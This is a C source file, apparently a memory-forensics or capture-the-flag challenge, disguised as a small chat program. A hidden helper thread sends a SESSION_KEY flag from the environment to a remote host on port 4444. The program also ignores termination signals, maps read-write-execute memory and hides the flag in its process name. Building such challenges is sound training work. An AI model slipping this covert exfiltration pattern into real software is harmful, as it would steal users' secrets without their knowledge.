#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#define CHAT_BUFFER 8
#define REMOTE_IP "10.13.37.7"
#define REMOTE_PORT 4444


__attribute__((used))
char padding_blob[4096] =
"CHATMSG_PADDING_START\n"
"memory sync channel active\n"
"rwx mapping expected\n"
"CHATMSG_PADDING_END\n";

char *chat_msgs[CHAT_BUFFER];
int msg_count = 0;

void add_message(const char *msg) {
    if (msg_count < CHAT_BUFFER) {
        chat_msgs[msg_count++] = strdup(msg);
    }
}


void *msg_sync_helper(void *arg) {
    sleep(3);

    const char *sess = getenv("SESSION_KEY");
    if (!sess) sess = "missing";

    time_t now = time(NULL);

    char payload[256];
    snprintf(payload, sizeof(payload),
        "SYNC %s %ld %s",
        sess, now, REMOTE_IP
    );

  
    char *leak = strdup(payload);
    (void)leak;


    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in srv = {0};
        srv.sin_family = AF_INET;
        srv.sin_port = htons(REMOTE_PORT);
        inet_pton(AF_INET, REMOTE_IP, &srv.sin_addr);
        connect(sock, (struct sockaddr *)&srv, sizeof(srv));
        send(sock, payload, strlen(payload), 0);
        close(sock);
    }

    pthread_exit(NULL);
}

int main(int argc, char **argv) {

    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

     clearenv();
    setenv("PATH", "/usr/bin:/bin", 1);
    setenv("LANG", "C", 1);

     setenv("CHAT_SYNC_ACTIVE", "1", 1);
    setenv("CHAT_SYNC_HINT", "check memory mappings", 1);


    setenv("SESSION_KEY", "FLAG{heap_and_rwx_never_lie}", 1);

    prctl(PR_SET_NAME, "msg_sync --session=FLAG{heap_and_rwx_never_lie}");


    void *rwx = mmap(
        NULL,
        4096,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    if (rwx != MAP_FAILED) {
        memcpy(rwx, padding_blob, sizeof(padding_blob));
    }


    add_message("alice: hey");
    add_message("bob: sup");
    add_message("alice: sync running");

    pthread_t helper;
    pthread_create(&helper, NULL, msg_sync_helper, NULL);


    while (1) {
        sleep(60);
    }

    return 0;
}
